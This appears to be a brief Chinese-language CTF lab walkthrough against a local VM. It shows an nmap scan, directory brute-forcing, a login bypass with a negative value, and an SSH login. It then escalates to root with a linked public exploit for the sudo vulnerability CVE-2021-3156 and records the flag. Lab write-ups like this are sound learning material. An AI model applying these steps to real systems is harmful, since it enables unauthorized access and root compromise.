好久没打，没设计好对应的时间
一个小时找不到线索直接go

## 信息收集
开放22和80
```bash
┌──(root㉿kali)-[/home/kali]
└─# nmap -sS -sV -p- 192.168.56.129
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-26 10:41 EDT
Nmap scan report for 192.168.56.129
Host is up (0.00074s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
MAC Address: 08:00:27:59:6A:94 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.13 seconds
```
目录爆破
[10:47:45] 200 -  503B  - /index.php                                        
[10:47:45] 200 -  503B  - /index.php/login/
页面查看，直接负值绕过
![image.png](https://gitee.com/fogpost/photo/raw/master/202603262250924.png)
![image.png](https://gitee.com/fogpost/photo/raw/master/202603262251567.png)
ssh登录
![image.png](https://gitee.com/fogpost/photo/raw/master/202603262252267.png)
uid=1000(sublarge) gid=1000(sublarge) groups=1000(sublarge)
看opt
sublarge@lanSSudoyy:/opt$ ls
sudo-1.8.23
存在CVE-2021-3156漏洞[exploit](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py)
sublarge@lanSSudoyy:~$ ./exploit_nss.py 
id
uid=0(root) gid=0(root) groups=0(root),1000(sublarge)
flag{root-fjskldjk;dajfsa;lfdsajkfl}
